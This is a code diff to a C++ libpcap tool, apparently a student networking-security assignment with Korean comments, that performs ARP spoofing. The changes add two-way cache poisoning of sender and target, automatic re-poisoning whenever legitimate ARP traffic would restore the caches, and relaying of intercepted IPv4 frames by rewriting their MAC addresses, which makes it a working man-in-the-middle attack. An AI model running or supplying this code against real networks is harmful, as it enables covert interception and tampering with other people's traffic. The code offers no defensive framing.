@@ -163,8 +163,9 @@ Mac getTargetMac(pcap_t *pcap, Ip myIp, Mac myMac, Ip senderIp)
     return Mac::nullMac();
 }
 
-void attack(int pairCnt, Ip *targetIps, Ip *senderIps, Mac myMac, pcap_t *pcap, Mac *senderMacs) {
-        // arp 테이블 공격 - 변조
+void attack(int pairCnt, Ip *targetIps, Ip *senderIps, Mac myMac, pcap_t *pcap, Mac *senderMacs)
+{
+    // arp 테이블 공격 - 변조
     for (int i = 0; i < pairCnt; i++)
     {
         EthArpPacket arpRes = makeArpRes(targetIps[i], myMac, senderIps[i], senderMacs[i]);
@@ -198,8 +199,8 @@ int main(int argc, char *argv[])
 
     for (int i = 0; i < pairCnt; i++)
     {
-        senderIps[i] = Ip(argv[(i*2+2)]);
-        targetIps[i] = Ip(argv[(i*2+3)]);
+        senderIps[i] = Ip(argv[(i * 2 + 2)]);
+        targetIps[i] = Ip(argv[(i * 2 + 3)]);
     }
 
     // 공격자(나) ip
@@ -228,10 +229,12 @@ int main(int argc, char *argv[])
     {
         printf("sender=%s, target=%s\n", std::string(senderIps[i]).c_str(), std::string(targetIps[i]).c_str());
         senderMacs[i] = getTargetMac(pcap, myIp, myMac, senderIps[i]);
-        printf("targetMac : %s\n", std::string(senderMacs[i]).c_str());
+        targetMacs[i] = getTargetMac(pcap, myIp, myMac, targetIps[i]);
+        printf("senderMac : %s\n", std::string(senderMacs[i]).c_str());
     }
 
     attack(pairCnt, targetIps, senderIps, myMac, pcap, senderMacs);
+    attack(pairCnt, senderIps, targetIps, myMac, pcap, targetMacs);
 
     // 패킷 수신
     while (true)
@@ -247,31 +250,69 @@ int main(int argc, char *argv[])
             break;
         }
 
-        // packet을 구조체로 변환
-        const struct EthArpPacket *ethArpPacket = (const struct EthArpPacket *)packet;
+        // 감염 풀리는 패킷 탐지
+        EthArpPacket *ethArpHdr = (EthArpPacket *)packet;
+        for (int i = 0; i < pairCnt; i++) {
+            if (ethArpHdr->arp_.op() == htons(ArpHdr::Reply) && ethArpHdr->arp_.tmac() == targetMacs[i]) {
 
-        // eth 타입이 ARP ARP 타입이 reply, 출발지, 목적지
-        if (ethArpPacket->eth_.type_ == htons(EthHdr::Arp))
-        {
-            if (ethArpPacket->arp_.op_ != htons(ArpHdr::Reply) && ethArpPacket->arp_.op_ != htons(ArpHdr::Request))
-                continue;
-            // 여기부터
+                Ip senderIp = ethArpHdr->arp_.sip();
+                Ip targetIp = ethArpHdr->arp_.tip();
+                Mac senderMac = ethArpHdr->arp_.smac();
 
-
-            // 수정합시다!!!
-            // arp reply 패킷 중 src IP 가 target의 IP 일 경우 -> IP 스캐닝 혹은 브로드캐스팅
-            if (ethArpPacket->arp_.sip_ != htonl(uint32_t(targetIps[0])) && ethArpPacket->arp_.tip_ != htonl(uint32_t(targetIps[1])))
-                continue;
-
-            printf("Arp detected\n");
-            // IP 출력
-            printf("%s, %s\n", std::string(ethArpPacket->arp_.sip_).c_str(), std::string(ethArpPacket->arp_.tip_).c_str());
-
-
+                attack(1, &targetIp, &senderIp, myMac, pcap, &senderMac);
+            }
         }
-        // if ()
 
-        sleep(1);
+        if (ethArpHdr->arp_.op() == htons(ArpHdr::Request) && ethArpHdr->arp_.tmac() == myMac) {
+
+            Ip senderIp = ethArpHdr->arp_.sip();
+            Ip targetIp = ethArpHdr->arp_.tip();
+            Mac senderMac = ethArpHdr->arp_.smac();
+
+            attack(1, &targetIp, &senderIp, myMac, pcap, &senderMac);
+        }
+
+        if (ethArpHdr->eth_.type() == EthHdr::Ip4)
+        {
+            for (int i = 0; i < pairCnt; i++)
+            {
+
+                // target -> sender
+                if (ethArpHdr->eth_.smac() == senderMacs[i] && ethArpHdr->eth_.dmac() == myMac)
+                {
+                    ethArpHdr->eth_.smac_ = myMac;
+                    ethArpHdr->eth_.dmac_ = targetMacs[i];
+
+                    // 읽을 크기만큼 전송
+                    int sendRes = pcap_sendpacket(pcap, packet, header->caplen);
+
+                    if (sendRes != 0 && ethArpHdr->eth_.type() == EthHdr::Ip4 && ethArpHdr->arp_.op()) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
+                    } else {
+                        printf("Packet Fowarded\nSender : %s -> target : %s", std::string(senderIps[i]).c_str(), std::string(targetIps[i]).c_str());
+                    }
+                }
+
+                // sender -> target
+                if (ethArpHdr->eth_.smac() == targetMacs[i] && ethArpHdr->eth_.dmac() == myMac)
+                {
+                    ethArpHdr->eth_.smac_ = myMac;
+                    ethArpHdr->eth_.dmac_ = senderMacs[i];
+
+                    // 읽을 크기만큼 전송
+                    int sendRes = pcap_sendpacket(pcap, packet, header->caplen);
+
+                    if (sendRes != 0 && ethArpHdr->eth_.type() == EthHdr::Ip4) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", sendRes, pcap_geterr(pcap));
+                    } else {
+                        printf("Packet Fowarded\ntTarget : %s -> sender : %s", std::string(targetIps[i]).c_str(), std::string(senderIps[i]).c_str());
+                    }
+                }
+            }
+        }
+
+        // 감염 풀리는거 확인 -> 다시 감염시키기~!
+
     }
     return 0;
 }
